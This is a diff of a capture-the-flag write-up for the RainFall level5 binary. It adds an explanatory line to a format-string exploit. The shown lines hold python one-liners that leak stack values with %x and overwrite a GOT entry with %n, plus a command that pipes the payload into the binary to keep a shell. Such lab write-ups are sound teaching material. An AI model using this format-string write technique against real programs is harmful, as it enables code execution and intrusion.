@@ -666,7 +666,7 @@ level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%x ' * 6" | ./level5
 level5@RainFall:~$ python -c "print '\x38\x98\x04\x08%4\$x'" | ./level5 
 88049838
 ```
-So we need to override it with address of o, thats 4 bytes, perfect
+So we need to override it with address of o, thats 4 bytes, perfect, now because there's no way to write an actual hex address to memory, need to convert it to decimal, substract 4 bytes (first address)
 ```
 $python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/tfou
 $cat /tmp/tfou - | ./level5
